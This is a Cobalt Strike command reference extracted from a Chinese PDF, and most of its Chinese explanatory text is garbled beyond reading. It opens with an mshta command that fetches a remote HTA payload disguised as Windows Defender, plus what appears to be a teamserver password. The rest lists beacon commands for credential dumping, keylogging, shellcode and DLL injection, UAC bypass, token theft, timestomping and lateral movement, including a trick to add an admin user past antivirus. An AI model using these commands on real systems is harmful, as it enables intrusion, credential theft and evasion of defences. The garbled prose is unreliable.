# Cobalt Strike常用命令

来源: 02-资料文档\Cobalt Strike常用命令.pdf

ଉአ޸ե
 
ਞᤰፓ୯ tools/ධڋၥᦶ
chichiHEHE@1d
mshta http://10.232.45.202:9002/WinDefender.ext
 
java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar
sudo java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -
Xmx1024M -jar cobaltstrike.jar
 
ӞԶ޸ե
 
 
getuid
getsystem
getprivs
 
net view mioffice.cn
net dclist // ڜڊऒഴګ࢏
net logons
net sessions
 
execute [program][arguments] # ޸եဌํࢧด
 
StealToken # ࣁऒݷӾ҅ฦ᭗አಁݎሿऒᓕᬩᤈጱᬰᑕ҅አᬯӻཛྷࣘ឴ݐऒᓕᬰᑕጱ๦ᴴ
 

 
Interact ಑୏beacon
Access
dumphashes ឴ݐhash
Elevate ൉๦
GoldenTicket ኞ౮Ἆᰂᐥഝဳف୮ڹտᦾ
MAketoken ڂᦤ᫨ഘ
RunMimikatz ᬩᤈ Mimikatz
SpawnAs አٌ՜አಁኞ౮CobaltStrikeׅލ࢏
Explore
BrowserPivot ۙ೮ፓຽၨᥦ࢏ᬰᑕ
Desktop(VNC) ໟᶎԻ԰
FileBrowser ෈կၨᥦ࢏
NetView ޸եNet View
Portscan ᒒݗಚൈ
Processlist ᬰᑕڜᤒ
Screenshot౼ࢶ
Pivoting
SOCKSServer դቘ๐ۓ
Listener ݍݻᒒݗ᫨ݎ
DeployVPN ᮱ᗟVPN
Spawn ෛጱ᭗ᦔཛྷୗଚኞ౮տᦾ
Session տᦾᓕቘ҅ڢᴻ҅ஞ᪡෸ᳵ҅ᭅڊ҅॓ဳ
 
ࣁऒሾहӥ҅ଉአaccessӾஉग़ཛྷࣘҔ؟౯ժሿࣁᬯᐿݝํӞݣᶓ๢ጱఘ٭ӥ҅exploreጱཛྷࣘฎஉํአ
ጱҔpivotingฎࣁṛᕆႽ᭐ᬦᑕӾᶋଉᕪَጱದ๞҅ࣁݸᖅṛᕆ᧞ᑕӾٚ઀୏
౯ժᬯེᆧఀӥexploreጱӞԶཛྷࣘ
ྲইscreenshot
ᭌӾݸࣁ෭பӾ੪ڊሿᦕ୯ԧ
 
 

 
ሾहਞᤰᯈᗝ
 
๐ۓᒒ
ਮಁᒒ - linux
 
ள᭛୏ত
 
ḒضڠୌӞӻlistener
ૢӤ᥯ጱcobaltstrike->listeners ̶ ྌ෸listenerڊሿԧෛᦕ୯
ളӥ๶౯ժᭌೠධڋጱ᭔ஆ
Attack -> html application -> Powershell҅᯻አhtmlଫአጱ᭔ஆධڋ
listeners
 
ፊލ࢏ҁlisteners҂——ᬯӻஉ᯿ᥝฎአ๶ፊލࢧᬳጱ
ݱᐿፊލ࢏ጱአ᭔
chmod 777 teamserver
[lan@pk-lan cobaltstrike4.0_cracked]$ sudo ./teamserver 10.231.46.125 
chichiHEHE@1d
[sudo] lan ጱੂᎱғ
[*] Generating X509 certificate and keystore (for SSL)
Warning:
JKS ੂᰬପֵአӫአ໒ୗ̶ୌᦓֵአ "keytool -importkeystore -srckeystore 
./cobaltstrike.store -destkeystore ./cobaltstrike.store -deststoretype pkcs12" 
ᬢᑏکᤈӱຽٵ໒ୗ PKCS12̶
[+] Team server is up on 50050
[*] SHA256 hash of SSL cert is: 
8156b9b2031df014e27e1ade6e9f2568b95ff6a62c66128117cf83377e6a68e8
 
  java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar

ፊލ࢏य़֛ړԅӷᔄbeacon޾foreign
beaconᔄԅCobalt Strike ᛔ᫝ፊލ࢏҅۱ೡdns,http,https,smbࢥᐿොୗጱፊލ࢏
foreignᔄԅक़᮱ፊލ࢏҅᭗ଉӨMSF౲ᘏArmitageᘶۖᒵᒵ
Beaconᔄፊލ࢏Օᕨ:
 
windows/beacon_dns/reverse_dns_txt
 
ق᮱᭗מἕᦊ᮷ฎֵአdns txtᬰᤈ(ᵌᠰ௔অ҅փᬌౌୌᦓࣁ෫ဩୌᒈtcpጱ෸ײֵአ)
windows/beacon_dns/reverse_http
 
ᒫӞེᬳളਖ਼᭗ᬦHTTP GETᬳളӥ᫹ٌಅํձۓԏݸਖ਼ἕᦊֵአdns Aᬰᤈ᭗מ
windows/beacon_http/reverse_http
 
ֵአhttp᭗מ
windows/beacon_https/reverse_https
 
ֵአhttpsےੂ᭗מ
windows/beacon_smb/bind_pipe
 
ֵአsmb᭗מࣁٖᗑӾֵአ҅᭗ᬦᆿᕆBeaconᬰᤈ᭗ᦔ
windows/beacon_tcp/bind_tcp
 
ֵአtcpᬰᤈ᭗מ޾ӤᶎጱsmbӞ໏
windows/foreign/reverse_http
windows/foreign/reverse_https
windows/foreign/reverse_tcp
᮷ฎक़᮱ፊލ࢏ړڦฎֵአhttp,https,tcpᬰᤈ᭗מ
windows/beacon dns/reverse dns_txt
windows/beacon_dns/reverse_http
windows/beacon_http/reverse_http
windows/beacon_https/reverse_https
windows/beacon_smb/bind_pipe
windows/beacon_tcp/bind_tcp
windows/foreign/reverse_http
windows/foreign/reverse_https
windows/foreign/reverse_tcp

 
beaconԅcsٖᗝፊލ࢏,Ԟ੪ฎ᧔,୮౯ժࣁፓຽᔮᕹ౮ۑಗᤈpayloadզݸ,տ୨ࢧӞӻbeaconጱshellᕳ
cs foreignԆᥝฎ൉׀ᕳक़᮱ֵአጱӞԶፊލ࢏,ྲই֦మڥአcsၝኞӞӻmeterpreter౲ᘏarmitageጱ
shellࢧ๶,๶ᖀᖅݸᶎጱٖᗑႽ᭐,ᬯ෸੪ᭌೠֵአक़᮱ፊލ࢏
 
Attack ධڋ
 
1.ኞ౮ݸᳪ҅ኞ౮ݱᐿݸᳪ๶ᬳളcsᬯ᯾ᥝ᧔Ӟӥኞ౮htaᑕଧ෸ӧᥝֵአExecutableވڞᬩᤈտಸᲙٍ
֛Ջԍᳯ᷌౯ԞဌํᎸᑪᬦݍྋٌ՜ጱݢզֵአইPowershellᔄࣳVBAᔄࣳ
HTML Application ኞ౮௶఺ጱHTA๙Ḙ෈կ
MS Office Macro ኞ౮officeਡየྰ෈կ
Payload Generator ኞ౮ݱᐿ᧍᥺ᇇ๜ጱpayload
USB/CD AutoPlay ኞ౮ڥአᛔۖඎනᬩᤈጱ๙Ḙ෈կ
Windows Dropper ഌᕬ࢏҅ᚆड़੒ٌ՜෈կᬰᤈഌᕬ
Windows Executable ኞ౮ݢಗᤈexe๙Ḙ
Windows Executable(S) ኞ౮෫ᴤྦྷጱݢಗᤈexe๙Ḙ
च๜ۑᚆֵአ
 
ڠୌፊލ࢏
 
Cobalt Strike—>ፊލ࢏—>Add
 
ڠୌݸᳪ
 
ධڋ—>ኞ౮ݸᳪ—>ᭌೠᔄࣳ
 
ᦏፓຽᬩᤈݸᳪᒵஇፓຽӤᕚ
ᬯ᯾౯ᬮฎදአلᗑvps୮๐ۓ࢏މๅ፥ਫӞԶ
 
external դᤒक़ᗑip(෬ฎᬳളcs๐ۓᒒጱip) internal դᤒٖᗑip user դᤒአಁ computer դᤒᦇᓒ
๢ݷ note դᤒ॓ဳ pid դᤒྌݸᳪጱpid last դᤒջ፦෸ᳵᬯӻ޾sleepํىྯ୮کᬡsleepᦡᗝጱᑁහ
෸੪տ᯿ᗝԅ0ἕᦊsleepԅ60
Beacon޸ե
 
help ଆۗ޸եดᐏق᮱޸ե
help xxx ดᐏ຤ӻ޸եጱᧇᕡמ௳
argue ᬰᑕ݇හྂḼ
argue [command] [fake arguments]
argue ޸ե ؃݇හ ྂḼ຤ӻ޸ե݇හ
argue [command]

argue ޸ե ݐၾྂḼ຤ӻ޸ե݇හ
ڥአᬯӻԞݢզᕰᬦ360Ⴒےአಁྲই:
argue net1 /hello /hello /hello /hello /hello
run net1 user admin 123451 /add
 
runasadmin # զṛ๦ᴴᬩᤈ
runasadmin [command] [args]
runasadmin ޸ե ݇හ
 
setenv አ๶ᦡᗝሾहݒᰁ
setenv [key] [value]
 
reg አ๶ັᧃဳٙᤒ
reg query  [x86|x64] [root\path]
reg queryv [x86|x64] [root\path] [subkey]
rootݢզֵአHKLM, HKCR, HKCC, HKCU, HKU
 
execute-assembly ࣁፓຽӤಗᤈ๜ࣈ.NETᑕଧ
execute-assembly [/path/to/file.exe] [args]
 
dllload ֵአLoadLibraryਖ਼DLLے᫹ک೰ਧጱᬰᑕӾ̶DLL஠ᶳࣁԭፓຽӤ
dllload [pid] [c:\path\to\file.dll]
 
getprivs # ސአੱݢᚆग़ጱᔮᕹ๦ᴴ
 
kerberos_ticket_purge Ⴔᴻ୮ڹshellጱKerberosᐥഝ
 
kerberos_ccache_use ՗ccache෈կӾ੕فKerberosᐥഝ
kerberos_ccache_use [/path/to/file.ccache]
 
kerberos_ticket_use ՗ticket෈կӾ੕فKerberosᐥഝ
kerberos_ticket_use [/path/to/file.ticket]
 
kill ᕮ๳ᬰᑕ
kill [pid]
 
ps ັ፡ᬰᑕڜᤒ
 
timestomp ਖ਼Ӟӻ෈կጱ෸ᳵ౿ଫአጱݚӞӻ෈կ
timestomp [fileA] [fileB]
 
bypassuac ᕰᬦuac឴ݐ๦ᴴ
bypassuac [listener]
 
getuid ឴ݐአಁID
 
rev2self ௩ܻ॔তեᇈ
 
steal_token ՗ᬰᑕӾᑲݐեᇈ

steal_token [pid]
 
getsystem ឴ݐsystem๦ᴴ
 
link ᯿ෛᬳളکSMB Beaconݸᳪଚୌᒈ੒ਙጱഴګ
link [target]
link ፓຽ
 
link [ip] ᬳളک೰ਧጱBeacon
link ipࣈ࣎
 
connect ᯿ෛᬳളکTCP Beaconݸᳪଚୌᒈ੒ਙጱഴګ
connect [target]
connect ፓຽ
 
unlink ෙ୏Ө୮ڹጱBeaconᬳള,ᒵஇݚӞӻBeaconጱᬳള
unlink ἕᦊෙ୏Ө୮ڹጱBeaconᬳള
unlink [ip] ෙ୏Ө೰ਧጱBeaconᬳള
 
cd ڔഘፓ୯
 
clear ႴᴻBeaconձۓڜᴚ
 
download ӥ᫹෈կ
download [file]
 
shell ಗᤈcmd޸ե(᭗ᬦcmd.exeᑕଧಗᤈ)
shell [command] [args]
 
powershell ಗᤈpowershell޸ե(᧣አpowershell.exeಗᤈ)
powershell [commandlet] [args]
 
powershell-import ੕فpowershellཛྷࣘ
powershell-import [/path/to/local/script.ps1]
 
execute ಗᤈᑕଧ
execute [program] [args]
ಗᤈᑕଧӧᬬࢧᬌڊ
 
run ಗᤈᑕଧ(޾shell޸ե૧ӧग़ӧᬦrunӧ᭗ᬦcmd.exeಗᤈ)
run [program] [args]
ಗᤈᑕଧᬬࢧᬌڊ
 
inject ݻӞӻᬰᑕဳفፊލ࢏shellcode
inject [pid] <x86|x64> [listener]
 
shinject ݻӞӻᬰᑕဳفshellcode
shinject [pid] <x86|x64> [/path/to/my.bin]
 

shspawn ڠୌӞӻᬰᑕଚਖ਼shellcodeဳفٌӾ̶
shspawn <x86|x64> [/path/to/my.bin]
 
dllinject ڥአݍ੘dllဳفӞӻᬰᑕ
dllinject [pid] [/path/to/my.dll]
 
keylogger ਖ਼Ძፏဳف࢏ဳف೰ਧᬰᑕ
keylogger [pid] <x86|x64> ဳف೰ਧᬰᑕ୏ސᲫፏᦕ୯
keylogger ୏ސᲫፏᦕ୯(ኞ౮Ӟӻԁ෸ᬰᑕଚਖ਼Ძፏᦕ୯ဳفٌӾ)
 
message ݻአಁดᐏၾ௳cs֢ᘏ᧔ᬯฎӞӻ఼ᤁጱ޸ե(ᒞ)
message [text] 
 
socks ୏ސsocks4դቘ
socks [stop|port] 
socks stop ؊ྊդቘ
socks port ࣁ೰ਧ ᒒݗ୏ސդቘ
ဳ఺:ইຎBeaconࣁ፻፦෸ၞᰁฎӧտᤩդቘጱ᧗ֵአsleepᬰᤈදݒ,ٺ੝፻፦෸ᳵ౲ๅදԅԻ԰ୗ
sleep 0
 
sleep ࣁ๋ڹᶎ᧔ԧᬯ᯾ӧ᧔ԧ
 
spawn ኞ౮x86౲x64ᬰᑕଚਖ਼shellcodeဳفٌӾၝኞտᦾ
spawn [x86|x64] [listener]
spawn [listener]
 
spawnto ೰ਧኞ౮ᬰᑕဳف෸ֵአጱᑕଧ᪠ஆἕᦊֵአጱᑕଧԅrundll32.exe
spawnto [x86|x64] [c:\path\to\whatever.exe]
 
upload Ӥփ෈կکፓຽ
upload [/path/to/file] 
 
runas զٌ՜አಁ᫝ղಗᤈᑕଧ
runas [DOMAIN\user] [password] [command] [args]
ইຎ๚೰ਧDOMAIN҅Beaconਖ਼੤ᦶզ๜ࣈአಁ᫝ղᬰᤈ᫝ղḵᦤ̶
ইຎ֦ࣁSYSTEMӤӥ෈Ӿ҅ྌ޸ե᭗ଉտ०ᨳ̶
 
pwd ັ፡ࣁፓຽ๢Ӥጱ᪠ஆ
 
covertvpn ڹᶎՕᕨᬦ
covertvpn [interface] [ip address]
 
browserpivot ၨᥦ࢏դቘڹᶎՕᕨᬦ
browserpivot [pid] [x86|x64]
browserpivot [stop]
 
desktop ᬱᑕໟᶎ(VNC)
desktop [pid] [x86|x64] [high|low]
desktop [high|low]

ਖ਼vncဳفک೰ਧᬰᑕݢզᭌೠኮᶎᨶᰁฎṛᨶᰁᬮฎ֗ᨶᰁ
 
jobs ڜڊࣁݸݣᬩᤈጱݱᐿݸႽ᭐ձۓ
 
jobkill ᕮ๳ݸႽ᭐ձۓ
jobkill [job ID]
 
hashdump ᫨ؙੂᎱߢ૶
 
wdigest ֵአmimikatz᫨ؙก෈ڂഝ
 
mimikatz ಗᤈmimikatz޸ե
mimikatz [module::command] <args>
mimikatz [!module::command] <args>
mimikatz [@module::command] <args>
޾ฦ᭗ֵአmimikatzဌՋԍ܄ڦ
 
screenshot ੽଒౼ࢶ
screenshot [pid] <x86|x64> [run time in seconds] 
screenshot ἕᦊ౼ࢶ੽଒
 
make_token ګ֢եᇈ
make_token [DOMAIN\user] [password]
ڹᶎݶ໏Օᕨᬦ
 
downloads ັ፡ྋࣁᬰᤈጱӥ᫹ձۓ
 
cancel ݐၾྋࣁᬰᤈጱӥ᫹
cancel [*file*] 
 
rportfwd ᒒݗ᫨ݎ
rportfwd [bind port] [forward host] [forward port] ୏ސ೰ਧᒒݗ᫨ݎ
rportfwd stop [bind port] ؊ྊ೰ਧᒒݗ᫨ݎ
 
elevate ֵአexp
elevate [exploit] [listener]
 
mkdir ڠୌፓ୯
mkdir [folder]
 
ls ັ፡෈կ
 
rm ڢᴻ෈կ
 
drives ڜڊፏᒧ
 
psexec_psh ڥአpsexec޾powershellኞ౮տᦾ
psexec_psh [host] [listener]
 

wmi ڥአWMI޾PowerShellኞ౮տᦾ
wmi [host] [listener]
 
winrm ڥአWinRM ޾PowerShellኞ౮տᦾ
winrm [host] [listener]
 
psexec ڥአpsexecኞ౮տᦾ
psexec [host] [share] [listener]
[share]೰ਧᥝਖ਼෈կ॔ګکߺӻوՁ(ֺই҅ADMIN$౲C$)
 
spawnas զٌ՜አಁ๦ᴴኞ౮տᦾ
spawnas [DOMAIN\user] [password] [listener]
 
portscan ᒒݗಚൈ
portscan [targets] [ports] [arp|icmp|none] [max connections]
portscan ፓຽ ᒒݗ ොୗ ๋य़ᬳള
ፓຽݢզ೰ਧӞӻ᝜ࢱ ᒒݗզ᭖ݩړᵍ
 
net netૡٍ޾WindwosӤጱ૧ӧग़
net computers
net dclist
net domain_trusts
net group
net localgroup
net groups
net logons
net sessions
net share
net user
net time
net view
 
logonpasswords ֵአmimikatz᫨ؙก෈ڂഝ޾NTLMߢ૶
 
note ॓ဳ
 
dcsync ੪ฎmimikatzጱdcsyncۑᚆ
dcsync [DOMAIN.fqdn] <DOMAIN\user>
 
powerpick ֵአUnmanaged PowerShellಗᤈ޸ե(ӧտ᧣አpowershell.exeᑕଧ)
powerpick [commandlet] [args]
 
psinject ݻᇙਧᬰᑕӾဳفᶋಓᓕPowerShellଚ᭗ᬦٌಗᤈ೰ਧጱ޸ե
psinject [pid] [x86|x64] [commandlet] [args]
 
ssh sshᬱᑕᬳള
ssh [ip:port] [user] [pass]
 
ssh-key ֵአੂᰬᬱᑕ

Script Console
 
ਞᤰᚕ๜ݸ҅ᬌفelevate ҅ๅෛ
ssh [ip:port] [user] [/path/to/key.pem]
 
cp ॔ګ෈կ
 
mv ᑏۖ෈կ
 
ppid ೰ਧӞӻpid֢ԅಗᤈBeacon޸եጱᆿᬰᑕ҅runas޸եӧݑᬯӻ୽ߥ
ppid [pid]
ppid ܔᇿᬌفppid᯿ᗝԅἕᦊ
 
spawnu ࣁ೰ਧጱpidӾኞ౮powershellৼᬰᑕಗᤈpalyoad
spawnu [pid] [listener]
 
runu ೰ਧӞӻpidԅᆿᬰᑕࣁٌӾಗᤈӞ๵޸ե
runu [pid] [command] [args]
 
? ಗᤈsleepڣෙ᧍ݙଚᬌڊᕮຎ
e ಗᤈsleep᧔ก᧍ݙ
help ଆۗ
load ے᫹Ӟӻᚕ๜
ls ڜڊے᫹ጱಅํᚕ๜
proff ىᳮᚕ๜ړຉ࢏
pron ԅ୏ސᚕ๜ړຉ࢏
profile ᚕ๜௔ᚆᕹᦇ
reload ᯿ෛے᫹ᚕ๜
troff ىᳮᚕ๜᪙᪵ۑᚆ
tron ୏ސᚕ๜᪙᪵ۑᚆ
unload ܬ᫹ᚕ๜
x ಗᤈsleepᤒᬡୗଚᬌڊᕮຎ
